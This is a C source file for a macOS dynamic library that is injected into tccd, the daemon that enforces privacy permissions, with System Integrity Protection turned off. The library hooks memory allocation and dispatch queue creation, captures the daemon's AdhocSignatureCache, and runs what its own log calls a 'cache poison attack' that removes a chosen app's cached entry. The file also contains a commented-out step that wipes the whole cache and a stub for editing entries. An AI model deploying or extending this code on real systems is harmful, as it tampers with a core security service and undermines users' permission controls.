/*
 * tccd_hook.c
 * Dylib for intercepting and modifying tccd's AdhocSignatureCache
 * 
 * Build: clang -dynamiclib -o tccd_hook.dylib tccd_hook.c -framework Foundation
 * Usage: DYLD_INSERT_LIBRARIES=/path/to/tccd_hook.dylib /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
 * 
 * WARNING: Requires SIP disabled (csrutil disable)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <objc/runtime.h>
#include <objc/message.h>
#include <dispatch/dispatch.h>
#include <time.h>
#include <stdarg.h>

// Function pointer types for original functions
typedef void* (*malloc_type_calloc_t)(size_t count, size_t size, uint64_t type);
typedef id (*objc_msgSend_t)(id self, SEL _cmd, ...);

// Original function pointers
static malloc_type_calloc_t original_malloc_type_calloc = NULL;
static objc_msgSend_t original_objc_msgSend = NULL;

// Hook tracking
static int cache_allocations = 0;
static void* adhoc_cache_ptr = NULL;
static id nscache_object = NULL;

// Target app to revoke (set via environment variable)
static char target_bundle_id[256] = {0};

// Logging
static FILE* log_file = NULL;

// Forward declarations
static void poison_cache_for_target(void);
static void log_msg(const char* format, ...);

static void init_logging(void) {
    // Use secure location from environment variable, fallback to temp
    const char* log_path = getenv("TCCD_HOOK_LOG_PATH");
    if (!log_path) {
        log_path = "/tmp/tccd_hook.log";
    }
    log_file = fopen(log_path, "a");
    if (log_file) {
        fprintf(log_file, "\n=== tccd_hook loaded at %ld ===\n", time(NULL));
        fflush(log_file);
    }
    
    // Get target bundle ID from environment
    const char* env_target = getenv("TCCD_REVOKE_TARGET");
    if (env_target) {
        strncpy(target_bundle_id, env_target, sizeof(target_bundle_id) - 1);
        log_msg("[HOOK] Target bundle ID for revocation: %s\n", target_bundle_id);
    } else {
        log_msg("[HOOK] No target bundle ID set (use TCCD_REVOKE_TARGET env var)\n");
    }
}

static void log_msg(const char* format, ...) {
    if (!log_file) return;
    
    va_list args;
    va_start(args, format);
    vfprintf(log_file, format, args);
    va_end(args);
    fflush(log_file);
}

// Hooked malloc_type_calloc - intercept cache allocation
void* malloc_type_calloc(size_t count, size_t size, uint64_t type) {
    // Get original function if not already done
    if (!original_malloc_type_calloc) {
        original_malloc_type_calloc = (malloc_type_calloc_t)dlsym(RTLD_NEXT, "malloc_type_calloc");
    }
    
    // Call original allocation
    void* ptr = original_malloc_type_calloc(count, size, type);
    
    // Check if this looks like the AdhocSignatureCache allocation
    // (size includes 0xc8 bytes + data, typically > 200 bytes)
    if (size > 200 && size < 100000) {
        cache_allocations++;
        log_msg("[HOOK] malloc_type_calloc: count=%zu, size=%zu (0x%zx), ptr=%p, allocation#%d\n", 
                count, size, size, ptr, cache_allocations);
        
        // This is likely the cache - store pointer
        if (cache_allocations >= 1 && !adhoc_cache_ptr) {
            adhoc_cache_ptr = ptr;
            log_msg("[HOOK] *** Captured AdhocSignatureCache at %p ***\n", ptr);
            
            // Dump the cache name at offset +0x88
            if (ptr) {
                char* name_ptr = (char*)ptr + 0x88;
                log_msg("[HOOK] Cache name: %s\n", name_ptr);
            }
            
            // Store NSCache object from offset +0x10
            void** cache_struct = (void**)ptr;
            if (cache_struct[2]) { // offset 0x10 = index 2
                nscache_object = (id)cache_struct[2];
                log_msg("[HOOK] NSCache object captured at %p\n", nscache_object);
            }
        }
    }
    
    return ptr;
}

// Hook NSCache setObject:forKey: to intercept cache writes
static void hook_nscache_methods(void) {
    Class nsCacheClass = objc_getClass("NSCache");
    if (!nsCacheClass) {
        log_msg("[HOOK] ERROR: Could not find NSCache class\n");
        return;
    }
    
    log_msg("[HOOK] NSCache class found at %p\n", nsCacheClass);
    
    // We'll use method swizzling to intercept cache operations
    SEL setObjectSelector = sel_registerName("setObject:forKey:");
    Method originalSetObject = class_getInstanceMethod(nsCacheClass, setObjectSelector);
    if (originalSetObject) {
        log_msg("[HOOK] Found NSCache setObject:forKey: method\n");
    }
}

// Monitor dispatch_queue_create to find the cache queue
dispatch_queue_t dispatch_queue_create(const char *label, dispatch_queue_attr_t attr) {
    static dispatch_queue_t (*original_dispatch_queue_create)(const char*, dispatch_queue_attr_t) = NULL;
    
    if (!original_dispatch_queue_create) {
        original_dispatch_queue_create = (void*)dlsym(RTLD_NEXT, "dispatch_queue_create");
    }
    
    dispatch_queue_t queue = original_dispatch_queue_create(label, attr);
    
    if (label && strstr(label, "AdhocSignatureCache")) {
        log_msg("[HOOK] *** Captured AdhocSignatureCache dispatch queue: %s ***\n", label);
        
        // If we have a target, start poisoning the cache
        if (nscache_object && target_bundle_id[0] != '\0') {
            log_msg("[HOOK] Starting cache poison attack for %s\n", target_bundle_id);
            poison_cache_for_target();
        }
    }
    
    return queue;
}

// Poison the cache to revoke permissions for target app
static void poison_cache_for_target(void) {
    if (!nscache_object) {
        log_msg("[HOOK] ERROR: NSCache object not available\n");
        return;
    }
    
    log_msg("[HOOK] Attempting to poison cache for %s\n", target_bundle_id);
    
    // Create an NSString for the bundle ID
    Class nsStringClass = objc_getClass("NSString");
    SEL stringWithUTF8String = sel_registerName("stringWithUTF8String:");
    id bundleIdString = ((id (*)(Class, SEL, const char*))objc_msgSend)(nsStringClass, stringWithUTF8String, target_bundle_id);
    
    if (!bundleIdString) {
        log_msg("[HOOK] ERROR: Could not create NSString for bundle ID\n");
        return;
    }
    
    // Remove the target from cache - forces tccd to re-check permissions
    SEL removeObjectForKey = sel_registerName("removeObjectForKey:");
    ((void (*)(id, SEL, id))objc_msgSend)(nscache_object, removeObjectForKey, bundleIdString);
    
    log_msg("[HOOK] ✓ Removed %s from signature cache\n", target_bundle_id);
    log_msg("[HOOK] ✓ tccd will now re-validate permissions for this app\n");
    
    // Optionally: Remove all cached entries to force full re-validation
    SEL removeAllObjects = sel_registerName("removeAllObjects");
    // Uncomment to nuke entire cache:
    // ((void (*)(id, SEL))objc_msgSend)(nscache_object, removeAllObjects);
    // log_msg("[HOOK] ✓ Nuked entire signature cache\n");
}

// Constructor - runs when dylib is loaded
__attribute__((constructor))
static void tccd_hook_init(void) {
    init_logging();
    log_msg("[HOOK] tccd_hook.dylib initializing...\n");
    log_msg("[HOOK] PID: %d\n", getpid());
    log_msg("[HOOK] Hooking malloc_type_calloc and dispatch_queue_create\n");
    
    hook_nscache_methods();
    
    log_msg("[HOOK] Initialization complete\n");
}

// Destructor - runs when dylib is unloaded
__attribute__((destructor))
static void tccd_hook_cleanup(void) {
    log_msg("[HOOK] tccd_hook.dylib unloading...\n");
    log_msg("[HOOK] Total cache allocations intercepted: %d\n", cache_allocations);
    
    if (adhoc_cache_ptr) {
        log_msg("[HOOK] Final cache pointer: %p\n", adhoc_cache_ptr);
    }
    
    if (log_file) {
        fclose(log_file);
    }
}

// Export function to manually modify cache from external tool
__attribute__((visibility("default")))
void tccd_modify_cache_entry(const char* bundle_id, const char* new_signature) {
    log_msg("[HOOK] Modification requested: bundle_id=%s, new_sig=%s\n", bundle_id, new_signature);
    
    if (!adhoc_cache_ptr) {
        log_msg("[HOOK] ERROR: Cache pointer not captured yet\n");
        return;
    }
    
    // Here you would implement actual cache modification logic
    // This requires understanding the exact cache structure
    log_msg("[HOOK] Cache modification not yet implemented\n");
}
